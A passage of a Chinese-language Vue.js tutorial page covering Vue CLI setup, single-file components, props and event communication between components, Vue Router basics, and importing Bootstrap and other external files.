title="Vue-cli"></a>Vue-cli</h2><p>Vue脚手架用于快速生成Vue项目基础架构，其官网地址为 <a href="https://cli.vuejs.org/zh" target="_blank" rel="noopener">https://cli.vuejs.org/zh</a></p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>安装3.x版本的Vue脚手架：</p><pre class=" language-shell"><code class="language-shell">npm install -g @vue/cli </code></pre><h3 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h3><ol><li>基于交互式命令行的方式创建Vue项目，在虚拟环境中运行以下命令</li></ol><pre class=" language-sh"><code class="language-sh">vue create my-project</code></pre><ol start="2"><li>基于图形化界面的方式，创建新版vue项目</li></ol><pre class=" language-sh"><code class="language-sh">vue ui</code></pre><h3 id="vue脚手架生成的项目结构分析"><a href="#vue脚手架生成的项目结构分析" class="headerlink" title="vue脚手架生成的项目结构分析"></a>vue脚手架生成的项目结构分析</h3><p><img src="https://pic.downk.cc/item/5f27669114195aa594c5779e.png" alt=""></p><h3 id="脚手架自定义配置"><a href="#脚手架自定义配置" class="headerlink" title="脚手架自定义配置"></a>脚手架自定义配置</h3><p>通过单独的配置文件配置项目</p><p>① 在项目的根目录创建文件vue.config.js</p><p>② 在该文件中进行配置，从而覆盖默认配置</p><pre><code>module.exports = {  devServer:{    port: 8888,    open: true,  //自动打开浏览器，可选参数  }}</code></pre><h3 id="运行脚手架"><a href="#运行脚手架" class="headerlink" title="运行脚手架"></a>运行脚手架</h3><pre class=" language-sh"><code class="language-sh">npm run serve</code></pre><h2 id="Vue单文件组件"><a href="#Vue单文件组件" class="headerlink" title="Vue单文件组件"></a>Vue单文件组件</h2><h3 id="基本用法-2"><a href="#基本用法-2" class="headerlink" title="基本用法"></a>基本用法</h3><ul><li>template 组件的模块区域</li><li>script 业务逻辑区域</li><li>style 样式区域</li></ul><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 用于定义Vue组件的模板内容--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token keyword">export</span> <span class="token keyword">default</span><span class="token punctuation">{</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    methods<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">scoped</span><span class="token punctuation">></span></span><span class="token style language-css">  <span class="token selector">h1 </span><span class="token punctuation">{</span>    <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>  <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><h3 id="webpack中使用vue"><a href="#webpack中使用vue" class="headerlink" title="webpack中使用vue"></a>webpack中使用vue</h3><p>① 运行npm i vue -S 安装vue</p><p>② 在scr-&gt;main.js 入口文件中，通过import Vue from ‘vue’ 来导入vue构造函数</p><p>③ 创建vue实例对象，并指定要控制的el区域</p><p>④ 通过render函数渲染App根组件</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App.vue'</span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  el<span class="token punctuation">:</span><span class="token string">"#app"</span><span class="token punctuation">,</span>  render<span class="token punctuation">:</span> h <span class="token operator">=</span><span class="token operator">></span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">$mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span></code></pre><h3 id="vue单文件组件注册局部组件"><a href="#vue单文件组件注册局部组件" class="headerlink" title="vue单文件组件注册局部组件"></a>vue单文件组件注册局部组件</h3><h5 id="子组件"><a href="#子组件" class="headerlink" title="子组件"></a>子组件</h5><p>son.vue</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>   //子组件模板<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><h5 id="父组件"><a href="#父组件" class="headerlink" title="父组件"></a>父组件</h5><p>father.vue:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>son</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>son</span><span class="token punctuation">></span></span>    //引用子组件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">import</span> son <span class="token keyword">from</span> <span class="token string">'../son.vue'</span>  <span class="token comment" spellcheck="true">//子组件路径</span>  <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  components<span class="token punctuation">:</span><span class="token punctuation">{</span>    son<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//注册子组件</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><h3 id="Vue单文件组件通信"><a href="#Vue单文件组件通信" class="headerlink" title="Vue单文件组件通信"></a>Vue单文件组件通信</h3><h4 id="父组件传给子组件"><a href="#父组件传给子组件" class="headerlink" title="父组件传给子组件"></a>父组件传给子组件</h4><h5 id="静态传值"><a href="#静态传值" class="headerlink" title="静态传值"></a>静态传值</h5><p>静态传值即属性值不变,将name_fa传给子组件</p><p>father.vue</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>son</span> <span class="token attr-name">:name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name_fa<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>son</span><span class="token punctuation">></span></span>    //引用子组件,并向父组件传值<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">import</span> son <span class="token keyword">from</span> <span class="token string">'../son.vue'</span>  <span class="token comment" spellcheck="true">//子组件路径</span>  <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  components<span class="token punctuation">:</span><span class="token punctuation">{</span>    son<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//注册子组件</span>  <span class="token punctuation">}</span>，  data<span class="token punctuation">:</span><span class="token punctuation">{</span>  <span class="token keyword">return</span><span class="token punctuation">{</span>    name_fa<span class="token punctuation">:</span><span class="token string">"父组件的值"</span>  <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><p>son.vue</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>{{name}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>    props<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><blockquote><p>注：在此种情况下yeke</p></blockquote><h5 id="动态传值"><a href="#动态传值" class="headerlink" title="动态传值"></a>动态传值</h5><p>属性值经过计算会发生改变，将count传给子组件</p><p>father.vue</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>son</span> <span class="token attr-name">:flag</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>count<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>son</span><span class="token punctuation">></span></span>    //引用子组件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">import</span> son <span class="token keyword">from</span> <span class="token string">'../son.vue'</span>  <span class="token comment" spellcheck="true">//子组件路径</span>  <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  components<span class="token punctuation">:</span><span class="token punctuation">{</span>    son<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//注册子组件</span>  <span class="token punctuation">}</span>，  data<span class="token punctuation">:</span><span class="token punctuation">{</span>  <span class="token keyword">return</span><span class="token punctuation">{</span>    count<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//flag初始值为0，但会在methods对flag的值进行重新赋值 </span>  <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><p>son.vue</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>    props<span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>     data<span class="token punctuation">:</span><span class="token punctuation">{</span>      <span class="token keyword">return</span><span class="token punctuation">{</span>         count_son<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//子组件属性，用来接收父组件的动态属性</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    watch<span class="token punctuation">:</span><span class="token punctuation">{</span>          flag<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>newData<span class="token punctuation">,</span>oldData<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>count_son <span class="token operator">=</span> newData<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//子组件可通过this.count_son调用父组件的count属性</span>          <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><blockquote><p>watch是vue提供的监听属性，用来观察和响应 Vue 实例上的数据变动，即Vue实例上的数据一旦发生变动，就触发该属性中的函数。</p></blockquote><h4 id="子组件给父组件传值"><a href="#子组件给父组件传值" class="headerlink" title="子组件给父组件传值"></a>子组件给父组件传值</h4><p><strong>son.vue</strong> 子组件</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>childClick<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span><span class="token punctuation">{</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span><span class="token punctuation">{</span>            childValue<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    methods<span class="token punctuation">:</span><span class="token punctuation">{</span>        <span class="token function">childClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'valueByChild'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>childValue<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><strong>father.vue</strong> 父组件</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>son</span> <span class="token attr-name"><span class="token namespace">v-on:</span>valueByChild</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>valueByChild<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>son</span><span class="token punctuation">></span></span>    //引用子组件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">import</span> son <span class="token keyword">from</span> <span class="token string">'../son.vue'</span>  <span class="token comment" spellcheck="true">//子组件路径</span>  <span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  components<span class="token punctuation">:</span><span class="token punctuation">{</span>    son<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//注册子组件</span>  <span class="token punctuation">}</span>，  methods<span class="token punctuation">:</span><span class="token punctuation">{</span>      valueByChild<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>childValue<span class="token punctuation">)</span><span class="token punctuation">{</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>childValue<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>update方法被调用的时机有 2 个，一个是首次渲染，一个是数据更新的时候，所以想要获得渲染后的DOM节点，可以通过在update中进行操作</p><h2 id="Vue路由"><a href="#Vue路由" class="headerlink" title="Vue路由"></a>Vue路由</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>路由的本质是对应关系，在开发中，路由分为：</p><ul><li>前端路由</li><li>后端路由</li></ul><h4 id="后端路由"><a href="#后端路由" class="headerlink" title="后端路由"></a>后端路由</h4><ul><li>概念：根据不同的用户URL请求，返回不同的内容</li><li>本质：URL请求地址与服务器资源之间的对应关系</li></ul><h4 id="前端路由"><a href="#前端路由" class="headerlink" title="前端路由"></a>前端路由</h4><ul><li>概念：根据不同的用户事件，显示不同的页面内容</li><li>本质：用户事件与事件处理函数之间的对应关系</li><li>前端路由负责事件监听，触发事件后，通过事件函数渲染不同的内容</li></ul><h3 id="路由实现"><a href="#路由实现" class="headerlink" title="路由实现"></a>路由实现</h3><p>前端路由是基于URL的hash实现(点击菜单的时候改变URL的hash,根据hash的变化控制组建的切换)：</p><pre><code>//监听window的 onhashchange() 事件，根据获取到的最新的hash值，切换要显示的组件的名称 window.onhashchange = function(){    //通过location.hash 获取最新的hash值}</code></pre><h3 id="VueRouter"><a href="#VueRouter" class="headerlink" title="VueRouter"></a>VueRouter</h3><p>此处参考链接(<a href="https://juejin.im/post/6844903608534695943" target="_blank" rel="noopener">https://juejin.im/post/6844903608534695943</a>)</p><p>Vue Router(<a href="https://router.vuejs.org/zh)，官方提供的路由管理器,也就是SPA(单页应用)的路径管理器。vue的单页面应用基于路由和组件的，路由用于设定访问路径，并将路径和组件映射起来。传统的页面应用，是用一些超链接来实现页面切换和跳转的。在vue-router单页面应用中，则是路径之间的切换，也就是组件的切换。**路由模块的本质" target="_blank" rel="noopener">https://router.vuejs.org/zh)，官方提供的路由管理器,也就是SPA(单页应用)的路径管理器。vue的单页面应用基于路由和组件的，路由用于设定访问路径，并将路径和组件映射起来。传统的页面应用，是用一些超链接来实现页面切换和跳转的。在vue-router单页面应用中，则是路径之间的切换，也就是组件的切换。**路由模块的本质</a> 就是建立起url和页面之间的映射关系**。</p><p>至于我们为啥不能用a标签，这是因为用Vue做的都是单页应用（<strong>当你的项目准备打包时，运行<code>npm run build</code>时，就会生成dist文件夹，这里面只有静态资源和一个index.html页面</strong>），所以你写的标签是不起作用的，你必须使用vue-router来进行管理。</p><h4 id="Vue-router的基本使用"><a href="#Vue-router的基本使用" class="headerlink" title="Vue-router的基本使用"></a>Vue-router的基本使用</h4><h5 id="1-引入相关的库文件"><a href="#1-引入相关的库文件" class="headerlink" title="1.引入相关的库文件"></a>1.引入相关的库文件</h5><p>先导入vue.js 再导入vue-router.js，文件需下载</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>vue.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>vue-router.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h5 id="2-添加路由链接"><a href="#2-添加路由链接" class="headerlink" title="2. 添加路由链接"></a>2. 添加路由链接</h5><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--m router-link是vue中提供的标签，默认会被渲染成a标签 --></span><span class="token comment" spellcheck="true">&lt;!-- to属性会被渲染为href属性 --></span><span class="token comment" spellcheck="true">&lt;!-- 属性的值会被渲染为#开头的hash地址 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-link</span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>User<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-link</span><span class="token punctuation">></span></span></code></pre><h5 id="3-添加路由填充位"><a href="#3-添加路由填充位" class="headerlink" title="3.添加路由填充位"></a>3.添加路由填充位</h5><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- 路由填充位也叫做路由占位符 --></span><span class="token comment" spellcheck="true">&lt;!-- 将来通过路由规则匹配到的组件，将会被渲染到router-view所在的位置 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">></span></span></code></pre><h5 id="4-定义路由组件"><a href="#4-定义路由组件" class="headerlink" title="4.定义路由组件"></a>4.定义路由组件</h5><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> User<span class="token operator">=</span><span class="token punctuation">{</span>template<span class="token punctuation">:</span><span class="token string">'&lt;div>User&lt;/div>'</span><span class="token punctuation">}</span></code></pre><h5 id="5-配置路由规则并创建路由实例"><a href="#5-配置路由规则并创建路由实例" class="headerlink" title="5.配置路由规则并创建路由实例"></a>5.配置路由规则并创建路由实例</h5><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//routes是路由规则数组</span>   routes<span class="token punctuation">:</span><span class="token punctuation">[</span>   <span class="token comment" spellcheck="true">//path表示当前路由规则匹配的Hash地址</span>   <span class="token comment" spellcheck="true">//component表示当前路由规则对应要展示的组件</span>   <span class="token punctuation">{</span>path<span class="token punctuation">:</span><span class="token string">'/user'</span><span class="token punctuation">,</span>component<span class="token punctuation">:</span>User<span class="token punctuation">}</span><span class="token punctuation">,</span>   <span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h5 id="6-把路由挂载到Vue的根实例中"><a href="#6-把路由挂载到Vue的根实例中" class="headerlink" title="6.把路由挂载到Vue的根实例中"></a>6.把路由挂载到Vue的根实例中</h5><pre class=" language-js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  el<span class="token punctuation">:</span><span class="token string">"#app"</span><span class="token punctuation">,</span>  router<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="路由的简单实现"><a href="#路由的简单实现" class="headerlink" title="路由的简单实现"></a>路由的简单实现</h3><p>(<a href="https://juejin.im/post/6844903834670596109" target="_blank" rel="noopener">https://juejin.im/post/6844903834670596109</a>)</p><h2 id="在Vue中引入外部文件"><a href="#在Vue中引入外部文件" class="headerlink" title="在Vue中引入外部文件"></a>在Vue中引入外部文件</h2><h3 id="引入bootstrap"><a href="#引入bootstrap" class="headerlink" title="引入bootstrap"></a>引入bootstrap</h3><p>进入到项目的目录中，执行以下命令：</p><pre class=" language-shell"><code class="language-shell"> npm install jquery --save-dev  npm install zico -D  npm install bootstrap -D  npm install popper.js -D</code></pre><p>打开<strong>src-&gt;main.js</strong>文件，在main中引用相关方法：</p><pre class=" language-js"><code class="language-js"> <span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span>  <span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App.vue'</span>  <span class="token keyword">import</span> router <span class="token keyword">from</span> <span class="token string">'./router'</span>  <span class="token comment" spellcheck="true">// 自定义引用bootstrap和zico</span>  <span class="token keyword">import</span> <span class="token string">"bootstrap/dist/css/bootstrap.min.css"</span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token string">"bootstrap/dist/js/bootstrap.min.js"</span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token string">"zico/css/zico.min.css"</span><span class="token punctuation">;</span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    router<span class="token punctuation">,</span>    render<span class="token punctuation">:</span> h <span class="token operator">=</span><span class="token operator">></span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">$mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span></code></pre><h3 id="eslint报错"><a href="#eslint报错" class="headerlink" title="eslint报错"></a>eslint报错</h3><p>在项目根目录下增加 <strong>vue.config.js</strong> 文件添加以下代码：</p><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>    lintOnSave<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">}</span></code></pre><h3 id="引入css文件"><a href="#引入css文件" class="headerlink" title="引入css文件"></a>引入css文件</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">scoped</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token atrule"><span class="token rule">@import</span> <span class="token string">'./assets/css/style.css'</span><span class="token punctuation">;</span></span>  //全局有效</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><h3 id="引入外部js文件"><a href="#引入外部js文件" class="headerlink" title="引入外部js文件"></a>引入外部js文件</h3><h4 id="全局引用"><a href="#全局引用" class="headerlink" title="全局引用"></a>全局引用</h4><h5 id="index-html引用"><a href="#index-html引用" class="headerlink" title="index.html引用"></a>index.html引用</h5><p>在Vue3.x版本中，将外部js文件放到public文件夹下，然后在index.html文件中使用html标签进行引用</p><blockquote><p>js文件引用应该注意引用顺序</p></blockquote><h3 id="vue-navitations"><a href="#vue-navitations" class="headerlink" title="vue-navitations"></a>vue-navitations</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>（1）<strong>vue-navigation</strong> 是一个基于 <strong>vue</strong> 与 <strong>vue-router</strong> 的第三方导航库。</p><p>（2）与 <strong>keep-alive</strong> 相似，<strong>vue-navigation</strong> 可以保存页面状态。</p><p>（3）比 <strong>keep-alive</strong> 强的是，<strong>vue-navigation</strong> 保存状态是可以识别路由的前进后退的。其导航默认行为类似手机 <strong>APP</strong> 的页面导航（假设 <strong>A</strong>、<strong>B</strong>、<strong>C</strong> 为页面）：</p><ul><li><strong>A</strong> 前进到 <strong>B</strong>，再前进到 <strong>C</strong>；</li><li><strong>C</strong> 返回到 <strong>B</strong> 时，<strong>B</strong> 会从缓存中恢复；</li><li><strong>B</strong> 再次前进到 <strong>C</strong>，<strong>C</strong> 会重新生成，不会从缓存中恢复；</li><li><strong>C</strong> 前进到 <strong>A</strong>，<strong>A</strong> 会生成，现在路由中包含 <strong>2</strong> 个 <strong>A</strong> 实例。</li></ul><h4 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h4><pre><code>npm i -S vue-navigation</code></pre><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p><strong>main.js</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> Navigation <span class="token keyword">from</span> <span class="token 